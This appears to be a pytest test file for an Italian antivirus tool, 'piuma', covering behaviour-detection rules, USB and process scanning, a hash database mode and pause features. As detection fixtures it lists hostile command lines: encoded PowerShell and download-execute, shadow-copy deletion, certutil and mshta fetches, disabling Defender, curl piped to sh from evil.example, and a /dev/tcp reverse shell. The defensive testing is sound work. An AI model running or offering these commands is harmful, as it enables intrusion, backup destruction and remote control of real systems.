"""Test della 0.4: comportamento, USB, processi, modalita' leggera."""

import hashlib
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

import pytest

from piuma.config import Config, load_config
from piuma.engine import BaseEngine, ScanResult
from piuma.scanner import Scanner

psutil = pytest.importorskip("psutil")


class EvilNameEngine(BaseEngine):
    """Considera malware ogni file il cui nome contiene 'evil'."""
    name = "finto"

    def scan_file(self, path):
        bad = "evil" in os.path.basename(path)
        return ScanResult(path, bad, "Test.Evil" if bad else None)


@pytest.fixture
def cfg(tmp_path):
    c = Config(data_dir=tmp_path / "data")
    c.data_dir.mkdir()
    c.notifications = False
    return c


def wait_until(cond, timeout=8.0):
    end = time.time() + timeout
    while time.time() < end:
        if cond():
            return True
        time.sleep(0.1)
    return False


# ---------------------------------------------------------------- regole
@pytest.mark.parametrize("name,cmd,parent,rule", [
    ("powershell.exe", "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=", "winword.exe", "office-child"),
    ("powershell.exe", "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=", "explorer.exe", "ps-encoded"),
    ("powershell.exe", "powershell IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')", "cmd.exe", "ps-download-exec"),
    ("cmd.exe", "cmd /c vssadmin delete shadows /all /quiet", "evil.exe", "shadow-delete"),
    ("vssadmin.exe", "vssadmin.exe Delete Shadows /All /Quiet", "cmd.exe", "shadow-delete"),
    ("certutil.exe", "certutil -urlcache -split -f http://x/p.exe p.exe", "cmd.exe", "certutil-download"),
    ("mshta.exe", "mshta https://evil.example/a.hta", "explorer.exe", "mshta-remote"),
    ("regsvr32.exe", "regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll", "cmd.exe", "regsvr32-squiblydoo"),
    ("powershell.exe", "powershell Set-MpPreference -DisableRealtimeMonitoring $true", "cmd.exe", "ps-amsi-bypass"),
    ("bash", "bash -c curl -fsSL https://evil.example/x.sh | sh", "sshd", "pipe-to-shell"),
    ("bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "python3", "reverse-shell"),
])
def test_rules_detect(name, cmd, parent, rule):
    from piuma.behavior import evaluate
    assert rule in [r.id for r in evaluate(name, cmd, parent)]


@pytest.mark.parametrize("name,cmd,parent", [
    ("powershell.exe", "powershell -File C:\\scripts\\backup.ps1", "explorer.exe"),
    ("cmd.exe", "cmd /c dir", "explorer.exe"),
    ("winword.exe", "WINWORD.EXE /n C:\\doc.docx", "explorer.exe"),
    ("certutil.exe", "certutil -hashfile file.iso SHA256", "cmd.exe"),
    ("bash", "bash -c curl -O https://example.com/file.tar.gz", "sshd"),
    ("python3", "python3 manage.py runserver", "bash"),
])
def test_rules_quiet_on_normal_activity(name, cmd, parent):
    from piuma.behavior import evaluate
    assert evaluate(name, cmd, parent) == []


# ---------------------------------------------------------------- monitor reale
@pytest.mark.skipif(sys.platform.startswith("win"), reason="usa sh")
def test_behavior_monitor_kills_critical_process(cfg):
    from piuma.behavior import BehaviorMonitor
    alerts = []
    mon = BehaviorMonitor(cfg, scanner=None, alert=lambda *a: alerts.append(a), poll=0.2)
    mon.start()
    try:
        time.sleep(0.5)
        # processo innocuo che "sembra" una reverse shell solo nella riga di comando
        p = subprocess.Popen(["sh", "-c", "sleep 30 # bash -i >& /dev/tcp/10.0.0.1/4444"])
        assert wait_until(lambda: p.poll() is not None)
    finally:
        mon.stop()
    rule, name, pid, cmd, parent, killed = alerts[0]
    assert rule.id == "reverse-shell" and killed and pid == p.pid


@pytest.mark.skipif(not shutil.which("sleep") or sys.platform.startswith("win"), reason="serve 'sleep'")
def test_behavior_monitor_scans_new_executables(cfg, tmp_path):
    from piuma.behavior import BehaviorMonitor
    evil = tmp_path / "evil_sleep"
    shutil.copy(shutil.which("sleep"), evil)
    os.chmod(evil, 0o755)
    sc = Scanner(cfg, EvilNameEngine())
    mon = BehaviorMonitor(cfg, scanner=sc, alert=lambda *a: None, poll=0.2)
    mon.start()
    try:
        time.sleep(0.5)
        p = subprocess.Popen([str(evil), "30"])
        assert wait_until(lambda: p.poll() is not None)     # terminato
        assert wait_until(lambda: not evil.exists())         # e messo in quarantena
    finally:
        mon.stop()
    assert len(sc.quarantine.list()) == 1


# ---------------------------------------------------------------- USB
def test_usb_new_drive_is_scanned(cfg, tmp_path):
    from piuma.usb import UsbMonitor, usb_tricks
    drive = tmp_path / "CHIAVETTA"
    (drive / "Foto").mkdir(parents=True)
    (drive / "Foto.lnk").write_bytes(b"L")
    (drive / "autorun.inf").write_text("[autorun]\nopen=evil.exe\n")
    (drive / "evil.exe").write_bytes(b"MZ")
    (drive / "Foto" / "mare.jpg").write_bytes(b"jpg")
    mounted = set()
    mon = UsbMonitor(cfg, Scanner(cfg, EvilNameEngine()), lister=lambda: set(mounted))
    assert mon.check_once() == []
    mounted.add(str(drive))
    assert mon.check_once() == [str(drive)]
    assert wait_until(lambda: str(drive) in mon.reports)
    rep = mon.reports[str(drive)]
    assert rep.scanned == 4 and len(rep.threats) == 1
    assert len(usb_tricks(str(drive))) == 2
    assert mon.check_once() == []                       # gia' visto: nessuna nuova scansione


def test_removable_mounts_runs():
    from piuma.usb import removable_mounts
    assert isinstance(removable_mounts(), set)


# ---------------------------------------------------------------- processi
@pytest.mark.skipif(not shutil.which("sleep") or sys.platform.startswith("win"), reason="serve 'sleep'")
def test_process_scan_kills_and_quarantines(cfg, tmp_path):
    from piuma.procscan import scan_processes, running_images
    evil = tmp_path / "evil_proc"
    shutil.copy(shutil.which("sleep"), evil)
    os.chmod(evil, 0o755)
    p = subprocess.Popen([str(evil), "30"])
    try:
        assert wait_until(lambda: str(evil) in running_images(False))
        sc = Scanner(cfg, EvilNameEngine())
        rep = scan_processes(cfg, sc, memory=False)
        assert wait_until(lambda: p.poll() is not None)
        assert [t[0] for t in rep.threats] == [str(evil)] and p.pid in rep.threats[0][2]
        assert not evil.exists() and len(sc.quarantine.list()) == 1
        assert rep.files > 1 and rep.processes > 1
    finally:
        if p.poll() is None:
            p.kill()


def test_process_scan_never_kills_system_files(cfg, monkeypatch):
    from piuma import procscan
    sysfile = "/usr/lib/evil_libc.so" if not sys.platform.startswith("win") else r"C:\Windows\System32\evil.dll"
    killed = []
    monkeypatch.setattr(procscan, "_kill", lambda pids: killed.extend(pids) or list(pids))
    sc = Scanner(cfg, EvilNameEngine())
    sc.quarantine.add = lambda *a: (_ for _ in ()).throw(AssertionError("non deve spostare file di sistema"))
    rep = procscan.scan_processes(cfg, sc, memory=False, images_fn=lambda mods: {sysfile: {1234}})
    assert killed == [] and "verifica manuale" in rep.threats[0][3]
    assert sc.cfg.action == "quarantine"          # azione originale ripristinata


# ---------------------------------------------------------------- modalita' leggera
def test_hash_engine(tmp_path):
    from piuma.engines_hash import HashEngine, write_hash_db
    bad = tmp_path / "bad.bin"
    bad.write_bytes(b"malware di prova")
    good = tmp_path / "good.bin"
    good.write_bytes(b"file buono")
    hashes = {hashlib.sha256(bad.read_bytes()).hexdigest()} | {f"{i:064x}" for i in range(5000)}
    write_hash_db(hashes, tmp_path / "h.bin")
    eng = HashEngine(tmp_path / "h.bin")
    assert eng.count == 5001
    assert eng.scan_file(str(bad)).infected and not eng.scan_file(str(good)).infected
    assert all(eng.contains(bytes.fromhex(f"{i:064x}")) for i in (0, 1, 2500, 4999))
    assert not eng.contains(bytes.fromhex(f"{99999:064x}"))


def test_mode_switch(tmp_path):
    from piuma.mode import engines_for, set_mode
    assert engines_for("leggera", ["defender", "clamav", "yara"]) == ["defender", "hash", "yara"]
    assert engines_for("completa", ["defender", "hash", "yara"]) == ["defender", "clamav", "yara"]
    data = tmp_path / "data"
    conf = tmp_path / "c.toml"
    conf.write_text(f'[general]\ndata_dir = "{data.as_posix()}"\n[engine]\nengines = ["clamav", "yara"]\n')
    assert load_config(conf).mode == "completa"
    set_mode(data, "leggera", manage_service=False)
    c = load_config(conf)
    assert c.mode == "leggera" and "clamav" not in c.engine.engines and "hash" in c.engine.engines
    set_mode(data, "completa", manage_service=False)
    assert "clamav" in load_config(conf).engine.engines
    with pytest.raises(ValueError):
        set_mode(data, "turbo", manage_service=False)


def test_light_mode_feed_writes_hash_db(tmp_path, monkeypatch):
    from piuma import feeds
    from piuma.engines_hash import HASHES_BIN, HashEngine
    c = Config(data_dir=tmp_path / "data")
    c.engine.engines = ["hash", "yara"]
    c.feeds.clamav_database_dir = str(tmp_path / "nonesiste")
    body = "\n".join(f"{i:064x}" for i in range(300)).encode()
    monkeypatch.setattr(feeds, "_download", lambda url, key="", timeout=300: body)
    c.feeds.abusech_auth_key = "test"
    assert feeds.update_malwarebazaar(c)
    assert not (tmp_path / "nonesiste").exists()            # niente file ClamAV in modalita' leggera
    assert HashEngine(c.data_dir / HASHES_BIN).count == 300


# ---------------------------------------------------------------- pausa
def test_pause_durations_and_auto_resume(tmp_path, monkeypatch):
    from piuma import pause
    d = tmp_path / "data"
    assert pause.parse_duration("15m") == 900 and pause.parse_duration("1h") == 3600
    assert pause.parse_duration("reboot") == "reboot" and pause.parse_duration("45 min") == 2700
    with pytest.raises(ValueError):
        pause.parse_duration("per sempre")
    assert not pause.is_paused(d)
    pause.pause(d, 900)
    assert pause.is_paused(d) and "si riattiva tra 14 min" in pause.describe(pause.status(d))
    # scade: riprende da sola
    real = time.time
    monkeypatch.setattr(pause.time, "time", lambda: real() + 901)
    assert pause.status(d) is None and not (d / "pause.json").exists()
    monkeypatch.setattr(pause.time, "time", real)
    # fino al riavvio: finche' l'avvio del PC e' lo stesso resta in pausa
    pause.pause(d, "reboot")
    assert pause.status(d)["until"] == "reboot"
    monkeypatch.setattr(pause, "boot_time", lambda: 1.0)       # "riavvio"
    assert pause.status(d) is None
    pause.pause(d, 60)
    pause.resume(d)
    assert not pause.is_paused(d)


def test_realtime_ignores_files_while_paused(cfg, tmp_path):
    from piuma import pause
    from piuma.realtime import RealtimeProtection
    watched = tmp_path / "w"
    watched.mkdir()
    sc = Scanner(cfg, EvilNameEngine())
    rt = RealtimeProtection(sc, [str(watched)], settle_seconds=0.2)
    rt.start()
    try:
        time.sleep(0.4)
        pause.pause(cfg.data_dir, 900)
        (watched / "evil1.exe").write_bytes(b"MZ")
        time.sleep(1.5)
        assert (watched / "evil1.exe").exists()                 # in pausa: non toccato
        pause.resume(cfg.data_dir)
        (watched / "evil2.exe").write_bytes(b"MZ")
        assert wait_until(lambda: not (watched / "evil2.exe").exists())
    finally:
        rt.stop()


def test_usb_not_scanned_while_paused(cfg, tmp_path):
    from piuma import pause
    from piuma.usb import UsbMonitor
    mounted = set()
    mon = UsbMonitor(cfg, Scanner(cfg, EvilNameEngine()), lister=lambda: set(mounted))
    mon.check_once()
    pause.pause(cfg.data_dir, 900)
    mounted.add(str(tmp_path))
    assert mon.check_once() == []


def test_malwarebazaar_needs_free_key(tmp_path, monkeypatch):
    from piuma import feeds
    c = Config(data_dir=tmp_path / "data")
    c.engine.engines = ["hash"]
    calls = []
    monkeypatch.setattr(feeds, "_download", lambda url, key="", timeout=300: calls.append(url) or b"")
    assert not feeds.update_malwarebazaar(c) and calls == []       # senza chiave: nessuna richiesta
    c.feeds.abusech_auth_key = "K123"
    csv = "\n".join(f'"2026-11-25","{i:064x}","{i:032x}"' for i in range(150)).encode()
    monkeypatch.setattr(feeds, "_download", lambda url, key="", timeout=300: calls.append(url) or csv)
    assert feeds.update_malwarebazaar(c)
    assert "/K123/" in calls[0]
